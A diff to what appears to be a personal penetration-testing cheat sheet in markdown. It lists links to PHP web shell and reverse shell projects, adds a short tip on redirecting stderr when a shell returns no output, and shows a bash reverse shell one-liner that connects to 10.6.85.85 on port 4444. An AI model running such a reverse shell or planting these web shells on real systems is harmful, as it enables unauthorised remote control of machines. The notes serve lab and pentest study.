@@ -7,7 +7,12 @@
 [phpbash web shell](https://github.com/Arrexel/phpbash)  
 [pentest monkey php shell](https://github.com/pentestmonkey/php-reverse-shell)  
 [p0wney web shell](https://github.com/flozz/p0wny-shell)  
-[collection of PHP webshells](https://github.com/JohnTroony/php-webshells/tree/master/Collection)   
+[collection of PHP webshells](https://github.com/JohnTroony/php-webshells/tree/master/Collection)    
+
+## Debugging Shells   
+executing a command and no response - maybe the command is redirecting to stderr not stdout?
+2>&1
+
 
 ## Reverse shell commands  
     bash -i >& /dev/tcp/10.6.85.85/4444 0>&1
